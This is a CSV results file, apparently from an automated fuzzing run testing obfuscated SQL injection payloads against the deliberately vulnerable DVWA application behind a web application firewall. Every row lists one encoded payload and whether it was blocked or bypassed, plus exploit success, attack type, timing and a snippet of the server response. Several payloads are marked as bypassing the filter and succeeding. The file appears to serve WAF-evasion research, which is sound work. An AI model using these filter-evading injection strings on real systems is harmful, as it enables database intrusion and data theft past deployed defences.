Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=1.%0bor+!%0btrue=%0b(!+true)%0bor',Bypassed,No,None,booleanAtk,0.0355,72.35,No,500,
0%27<@=1.+||+!+{`if`%0b1}=1=%0b(!%0b{`if`+1}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0299,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+{a%0b1}=1+like+{`if`%0b1}=1%0bor',Bypassed,No,None,Unknown,0.0259,72.05,No,500,
0%27<@=1%0b||%0b{a+1}=1%0blike+{x%0b(select%0b1)}=1%0b||',Bypassed,No,None,Unknown,0.0325,72.05,No,500,
0%27<@!=.1+||%0b!%0b{x+(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1)+||%27,Blocked,No,None,Unknown,0.0198,72.05,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor+!+{x+(select+1)}=1=%0b(not%0b{a+1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.027,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+not%0b{`if`%0b1}=1=+(not+{x+(select%0b1)}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0314,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+!+true=%0b(!+{x%0b(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0149,72.05,No,500,
0'<@=1%0b||+not+true=+(not%0b{x%0b(select+1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0232,72.05,No,500,
0%27<@!=1.+or+not%0b{x+(select+1)}=1=%0b(not+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0313,72.05,No,500,
0'<@=1+||+!+{x+(select%0b1)}=1=%0b(!%0b{x+(select+1)}=1)--+,Blocked,No,None,piggyAtk,0.0196,72.05,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0b||+{a%0b1}=1%0blike%0b{x+(select+1)}=1%0b||',Bypassed,No,None,Unknown,0.0339,72.05,No,500,
0%27<@!=.1%0b||%0bnot+{x%0b(select%0b1)}=1=+(not~0)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0491,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+!%0b{x%0b(select%0b1)}=1=+(not%0btrue)+||',Bypassed,No,None,booleanAtk,0.0234,72.05,No,500,
0'<@!=1+||+!+{`if`%0b1}=1=%0b(not+{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0424,72.05,No,500,
0%27<@=1.+||+not+true=%0b(!+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0262,72.05,No,500,
0'<@!=1%0b||%0bfalse=+(!+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.028,72.05,No,500,
0'or+!@<@.%0bor%0b{a+1}=1%0blike%0b{`if`%0b1}=1+||',Bypassed,No,None,Unknown,0.0294,72.05,No,500,
0'<@=1%0b||+!%7efalse=+(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0368,72.05,No,500,
0%27<@=.1+or+not+{x+(select+1)}=1=+(not+{x%0b(select+1)}=1)+or',Blocked,No,None,Unknown,0.0147,72.05,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+or%0b!+{x%0b(select+1)}=1=+(not%0b{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0387,72.17,No,500,
0'<@=.1+or+not%0b{x%0b(select+1)}=1=%0b(not+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.04,72.3,No,500,
0%27<@=1.+||%0bnot%0b{a+1}=1=%0b(not~0)+||',Bypassed,No,None,Unknown,0.018,72.3,No,500,
0%27<@=1+or+{`if`+1}=1+like+{x%0b(select+1)}=1%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0209,72.3,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'||+@<@+||+true+like%0b{a%0b1}=1%0b||%27,Bypassed,No,None,Unknown,0.0379,72.3,No,500,
0%27<@!=1.+or+not+{a%0b1}=1=%0b(!+true)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0229,72.32,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{a+1}=1=%0b(!%0b{`if`+1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0181,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0b!%0b{`if`%0b1}=1=+(not+{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0214,72.35,No,500,
0%27<@!=1+or+not%0btrue=+(not%0b{`if`+1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0332,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0b!%0b{a+1}=1=%0b(!%0b{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0289,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+not+{`if`%0b1}=1=%0b(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0322,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor%0b!+{a%0b1}=1=+(!%0b1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0177,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor%0bnot+1=%0b(!~false)+or%27,Bypassed,No,None,booleanAtk,0.0257,72.35,No,500,
0'<@=.1+||+not%7efalse=%0b(!~false)+||',Bypassed,No,None,Unknown,0.0397,72.35,No,500,
0'<@=.1+or+not+{`if`+1}=1=+(!+true)%0b||%27,Bypassed,No,None,booleanAtk,0.0314,72.35,No,500,
0'<@!=.1+||+not%0b{x+(select%0b1)}=1=%0b(not+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0282,72.35,No,500,
0%27<@=1%0b||+not%0b{x%0b(select+1)}=1=%0b(!~false)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0216,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||+!+{`if`+1}=1=+(not%0b{x%0b(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0309,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+not%0b{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0324,72.35,No,500,
0%27<@!=.1%0bor+!%7e0=+(!+{x+(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0322,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{x%0b(select+1)}=1=+(not~0)+||',Bypassed,No,None,Unknown,0.0166,72.35,No,500,
0%27<@!=.1%0bor%0bnot+{a+1}=1=+(not+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0117,72.35,No,500,
0%27<@=.1+or+!+{`if`+1}=1=%0b(false)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0215,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+not%0b{x+(select+1)}=1=%0b(not+{x%0b(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0185,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor%0bnot+{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0287,72.35,No,500,
0'<@!=1.%0b||+!%0b{x+(select+1)}=1=+(not+{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0287,72.35,No,500,
0%27<@!=1.%0b||%0b!%7efalse=%0b(not+{a%0b1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0257,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or%0b{x%0b(select+1)}=1+like+{`if`+1}=1+or',Bypassed,No,None,Unknown,0.0258,72.35,No,500,
0%27<@=1.+or+not%0b{a%0b1}=1=%0b(not+{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0279,72.35,No,500,
0'<@=1.+or%0bnot+true=%0b(false)+or%27,Bypassed,No,None,booleanAtk,0.0167,72.35,No,500,
0'<@=1%0b||+not%0b{a+1}=1=%0b(not%7e0)+or%27,Bypassed,No,None,Unknown,0.0217,72.35,No,500,
0%27<@!=1+||%0b!+{a%0b1}=1=+(not%7e0)%0bor',Bypassed,No,None,Unknown,0.0242,72.35,No,500,
0'<@!=1+or+!+{a+1}=1=%0b(!+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0287,72.05,No,500,
0'<@=1+or+!%0b{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.04,72.05,No,500,
0'<@=1%0bor%0b!%0b{x%0b(select%0b1)}=1=+(not+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0247,72.05,No,500,
0'<@!=1.+||%0b!%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1)+or',Blocked,No,None,Unknown,0.022,72.05,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+||+!+{x+(select+1)}=1=+(not%0btrue)+or',Blocked,No,None,booleanAtk,0.0265,72.05,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor+!%0b{x+(select%0b1)}=1=+(!%0b{a+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0159,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+not+{a%0b1}=1=+(!+{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0288,72.05,No,500,
0'<@=.1+or+!%0b{x%0b(select+1)}=1=+(not+{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0139,72.05,No,500,
0'<@=.1%0b||+not+{x+(select+1)}=1=+(!%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0149,72.05,No,500,
0'<@!=.1%0bor+{x+(select+1)}=1+like+true%0bor',Bypassed,No,None,booleanAtk,0.0251,72.05,No,500,
0'<@!=1+or+{x+(select%0b1)}=1%0blike%0b1+or%27,Blocked,No,None,Unknown,0.0273,72.05,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0bor+not%0b{`if`%0b1}=1=%0b(!+true)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0212,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+not%0b{x%0b(select+1)}=1=%0b(!~false)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0279,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||+not%0btrue=+(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0416,72.05,No,500,
0'<@=.1+or%0bnot+{x%0b(select+1)}=1=+(not+{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0404,72.05,No,500,
0'<@=1.+||%0b!%7efalse=%0b(not+{x%0b(select%0b1)}=1)+||',Blocked,No,None,Unknown,0.0162,72.05,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or+not%0b{`if`+1}=1=%0b(not%0b{a+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0198,72.05,No,500,
0%27<@=.1+||+not%0b{x%0b(select+1)}=1=%0b(not%0b{a+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0176,72.17,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
